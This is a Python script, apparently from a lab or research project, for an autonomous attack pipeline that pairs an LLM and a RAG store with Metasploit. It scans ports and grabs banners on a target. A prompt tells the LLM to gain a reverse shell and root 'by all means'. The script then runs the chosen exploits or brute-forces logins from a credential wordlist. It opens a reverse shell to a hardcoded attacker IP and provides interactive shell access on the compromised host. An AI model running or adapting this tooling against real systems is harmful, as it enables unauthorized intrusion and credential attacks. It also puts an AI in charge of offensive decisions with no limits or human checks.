# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures
import argparse

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ["ANONYMIZED_TELEMETRY"] = "False"

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine

# --- COLORS ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

# --- CONFIG ---
ATTACKER_IP = "192.168.70.20" 
LOOT_DIR = "/app/data/logs"
WORDLIST_PATH = "/app/data/credentials.txt"
API_KEY_PATH = "/app/config/api_key.txt"

os.makedirs(LOOT_DIR, exist_ok=True)

class PentestPipeline:
    def __init__(self, target_ip, use_rag=True):
        self.target_ip = target_ip
        self.use_rag = use_rag
        modo_str = "RAG HABILITADO" if self.use_rag else "LLM PURA (SEM RAG)"
        
        print(f"=== INICIALIZANDO PIPELINE AUTONOMO (V14 - {modo_str}) ===")
        print(f"[*] Alvo Definido: {self.target_ip}") 
        print(f"[*] IP do Atacante (LHOST): {ATTACKER_IP}")
        
        self.setup_api_key()
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    if self.use_rag:
                        self.rag = RagEngine()
                    else:
                        self.rag = None
                finally:
                    sys.stderr = old_stderr
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.open_ports = {} 
        self.session_id = None
        self.evidence = {}
    
    def cleanup_sessions(self):
        try:
            sessions = self.msf.client.call('session.list')
            if sessions:
                for sid in sessions.keys():
                    self.msf.client.call('session.stop', [str(sid)])
                time.sleep(1)
        except: pass

    def setup_api_key(self):
        if "GOOGLE_API_KEY" in os.environ and os.environ["GOOGLE_API_KEY"]: return
        if os.path.exists(API_KEY_PATH):
            try:
                with open(API_KEY_PATH, "r") as f:
                    key = f.read().strip()
                    if key: os.environ["GOOGLE_API_KEY"] = key
            except: pass

    def load_credentials(self):
        creds = []
        if not os.path.exists(WORDLIST_PATH): return []
        try:
            with open(WORDLIST_PATH, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        parts = line.split(":", 1)
                        creds.append((parts[0], parts[1]))
            return creds
        except: return []

    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.7) 
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def fast_python_scan(self):
        open_ports_found = []
        ports = list(range(1, 1025)) + list(range(20000, 30000))
        print(f"{C_YELLOW}[*] Escaneando {len(ports)} portas...{C_RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, p): p for p in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                p = future.result()
                if p: open_ports_found.append(str(p))
        return sorted(open_ports_found, key=int)

    def get_service_banner(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.target_ip, int(port)))
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return re.sub(r'[^\x20-\x7E]', '', banner)
            except socket.timeout: pass

            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                clean = re.sub(r'[^\x20-\x7E]', '', banner)
                return clean if clean else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    # --- SMART RESOLVER ---
    def resolve_module_name(self, bad_name):
        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
        search_terms = []
        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
        
        if "/" in base_name: search_terms.append(base_name.split("/")[-1])
        else: search_terms.append(base_name)

        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc']:
            if proto in base_name: search_terms.append(proto)

        for term in search_terms:
            try:
                res = self.msf.client.call('module.search', [term])
                if not res: continue
                candidates = []
                for mod in res:
                    m_name = mod.get('fullname')
                    if term not in m_name: continue
                    if "auxiliary/scanner" in m_name: candidates.append(m_name)
                    elif "exploit" in m_name and "exploit" in bad_name: candidates.append(m_name)

                if candidates:
                    candidates.sort(key=len)
                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
                    return candidates[0]
            except: pass
        return bad_name

    def generate_text_report(self):
        now = datetime.datetime.now()
        safe_ip = self.target_ip.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        
        lines = [
            "="*50, "RELATORIO FINAL", "="*50,
            f"DATA: {now}", f"STATUS: {'PWNED' if self.session_id else 'FALHA'}", "-"*50,
            f"PORTAS: {list(self.open_ports.keys())}", "\n[HISTORICO]"
        ] + [f"- {h}" for h in self.history]
        
        if hasattr(self, 'evidence') and self.evidence.get("shell_info"):
             lines.append("\n[EVIDENCIAS]")
             lines.append(f"SHELL INFO: {self.evidence['shell_info']}")

        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
            print(f"\n{C_GREEN}{'='*60}")
            print(f" [LOG] RELATORIO SALVO: {filepath}")
            print(f"{'='*60}{C_RESET}\n")
        except Exception as e:
            print(f"{C_RED}[ERRO LOG] Nao foi possivel salvar relatorio: {e}{C_RESET}")

    def ask_llm_robust(self, prompt, max_retries=3):
        for attempt in range(max_retries):
            try:
                resp = self.llm.ask(prompt, history=[]).replace("```json", "").replace("```", "").strip()
                if resp: return resp
            except Exception as e:
                time.sleep((attempt + 1) * 2)
        return None

    def enter_interactive_mode(self):
        if not self.session_id: return
        print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip} > {C_RESET}")
                if cmd.lower() in ['exit', 'quit']:
                    print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                    break
                if not cmd.strip(): continue
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(1.5)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
            except: break

    def run(self):
        self.cleanup_sessions()
        print(f"\n>>> [FASE 1] RECONHECIMENTO")
        ports = self.fast_python_scan()
        if not ports: return
        
        self.open_ports = {}
        for p in ports:
            b = self.get_service_banner(p)
            self.open_ports[p] = b
            print(f"    {C_GREEN}[+] Porta {p}: {b}{C_RESET}")

        modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG"
        print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
        
        
        if self.use_rag:
            try:
                total_vetores = self.rag.vectordb._collection.count()
                print(f"{C_YELLOW}[*] RAG Status: {total_vetores} vetores carregados do disco.{C_RESET}")
                if total_vetores == 0:
                    print(f"{C_RED}[ALERTA] O banco esta vazio! A ingestao nao foi salva no disco.{C_RESET}")
            except Exception as e:
                print(f"{C_RED}[ERRO RAG] Falha ao acessar o banco: {e}{C_RESET}")
        
        wordlist_creds = self.load_credentials()

        for port, banner in self.open_ports.items():
            
            # --- FILTRO CIRURGICO: Focar apenas na 139 ---
            if str(port) != "139":
                continue
            
            print(f"\n{C_CYAN}--- ALVO ESTRATEGICO: PORTA {port} ({banner}) ---{C_RESET}")
            
            if self.use_rag:
                rag_context = "Nenhuma informacao especifica encontrada no RAG."
                try:
                    
                    query = f"INTERNAL RED TEAM DOCUMENTATION CORP port {port} Smart-Regula"
                    docs = self.rag.query(query)
                    
                    if docs: 
                        rag_context = "\n".join([d.page_content for d in docs[:3]])
                        print(f"\n{C_MAGENTA}=== [RAG DEBUG] MEMORIA RECUPERADA ==={C_RESET}")
                        print(f"{C_MAGENTA}{rag_context}{C_RESET}")
                        print(f"{C_MAGENTA}======================================{C_RESET}\n")
                    else:
                        print(f"{C_RED}[RAG DEBUG] Nenhum documento retornado pelo ChromaDB.{C_RESET}")
                except Exception as e: 
                    print(f"{C_RED}[ERRO NO RAG] {e}{C_RESET}")
            else:
                rag_context = "AVISO RAG DESATIVADO: Aja APENAS de acordo com seu conhecimento previo."

            prompt = f"""
            YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.            
            
            TARGET IP: {self.target_ip}
            TARGET PORT: {port}
            ATTACKER IP (LHOST): {ATTACKER_IP}
            SERVICE BANNER: "{banner}"
            
            KNOWLEDGE BASE (RAG):
            {rag_context}
            
            ANALYSIS RULES:
            1. Base your reasoning STRICTLY on the service banner and the RAG context.
            2. If RAG dictates a MANDATORY module and payload, you MUST use them exactly.
            3. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
               - Include "LHOST": "{ATTACKER_IP}" and "LPORT": "4444".
               - "DisablePayloadHandler": "false".
            4. Choose Strategy carefully: "exploit_cve", "brute_force" or "enumeration".
               
            OUTPUT FORMAT (JSON ONLY):
            {{
              "module_type": "exploit" | "auxiliary",
              "module_name": "category/service/module_name",
              "strategy": "exploit_cve" | "brute_force" | "enumeration" | "skip",
              "options": {{"OPT_NAME": "OPT_VALUE"}}
            }}
            """
            
            resp = self.ask_llm_robust(prompt)
            plan = {}
            if resp:
                try: 
                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                    plan = json.loads(resp)
                except: pass

            strategy = plan.get('strategy', 'skip').lower()
            module = plan.get('module_name', '').strip()
            llm_options = plan.get('options', {})
            
            if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")

            if strategy == "skip": continue
            if "login" in module or "credential" in module: strategy = "brute_force"

            # 1. Limpa o nome do modulo removendo os prefixos que a IA pode ter colocado
            clean_name = module.replace("exploit/", "").replace("auxiliary/", "").strip("/")

            # 2. Verifica se o modulo existe
            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
               not self.msf.verify_module_exists("exploit", clean_name):
                fixed = self.resolve_module_name(clean_name)
                if fixed: 
                    clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
                else:
                    print(f"{C_RED}[ERRO] Modulo '{clean_name}' invalido.{C_RESET}")
                    continue

            # 3. Define o tipo na estrategia
            if strategy == "exploit_cve":
                m_type = "exploit"
            else:
                m_type = "auxiliary"
                
            m_name = clean_name
            
            opts = {"RHOSTS": self.target_ip, "RPORT": int(port)}
            opts.update(llm_options)
            
            print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
            
            if strategy == "brute_force":
                if not wordlist_creds:
                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
                    continue
                print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
                
                opts["STOP_ON_SUCCESS"] = "true"
                opts["BLANK_PASSWORDS"] = "false"
                opts["USER_AS_PASS"] = "false"
                opts["VERBOSE"] = "false"
                
                found = False
                for user, pwd in wordlist_creds:
                    opts["USERNAME"] = user
                    opts["PASSWORD"] = pwd
                    print(f"    Testing: {user}:{pwd}", end='\r') 
                    try:
                        self.msf.run_module(m_type, m_name, opts)
                        time.sleep(2) 
                        s = self.msf.client.call('session.list')
                        if s:
                            sid = str(max([int(k) for k in s.keys()]))
                            if sid != self.session_id:
                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
                                self.session_id = sid
                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
                                found = True
                                break
                    except: pass
                if not found: print(f"\n{C_RED}[FALHA] Credenciais invalidas.{C_RESET}")

            elif strategy == "enumeration":
                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
                try:
                    self.msf.run_module(m_type, m_name, opts)
                    time.sleep(4)
                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
                except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")

            elif strategy == "exploit_cve":
                print(f"{C_YELLOW}[*] Tentando Exploit...{C_RESET}")
                opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                
                print(f"{C_YELLOW}[DEBUG] Executando {m_type}/{m_name}{C_RESET}")
                print(f"{C_YELLOW}[DEBUG] Opcoes decididas pela IA: {opts}{C_RESET}")
                
                self.msf.run_module(m_type, m_name, opts)
                print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
                time.sleep(20) 
                
                sessions = self.msf.client.call('session.list') or {}
                if sessions:
                    sid = str(max([int(k) for k in sessions.keys()]))
                    if sid != self.session_id:
                        print(f"{C_GREEN}[***] SUCESSO! Exploit funcionou (Sessao {sid}){C_RESET}")
                        self.session_id = sid
                    else:
                        print(f"{C_RED}[FALHA] Exploit rodou, mas nenhuma NOVA sessao foi criada.{C_RESET}")
                else:
                    print(f"{C_RED}[FALHA] Nenhuma sessao ativa encontrada apos o exploit.{C_RESET}")

            if self.session_id: 
                print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                break
        
        if self.session_id: self.phase_4_post_exploitation()
        self.generate_text_report()

    def phase_4_post_exploitation(self):
        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
            time.sleep(3)
            res = self.msf.client.call('session.shell_read', [self.session_id])
            print(f"{C_GREEN}{res['data']}{C_RESET}")
            self.evidence["shell_info"] = str(res['data'])
            
            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
        except: pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pipeline Autonomo Metasploit + LLM + RAG")
    parser.add_argument("--target", required=True, help="Endereço IP do alvo (ex: 192.168.70.30)")
    parser.add_argument("--disable-rag", action="store_true", help="Desativa a integracao com o ChromaDB para testar o modelo isoladamente.")
    args = parser.parse_args()

    p = PentestPipeline(target_ip=args.target, use_rag=not args.disable_rag)
    
    try:
        p.run()
        if p.session_id:
            p.enter_interactive_mode()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Interrupcao detectada. Salvando logs...{C_RESET}")
        p.generate_text_report()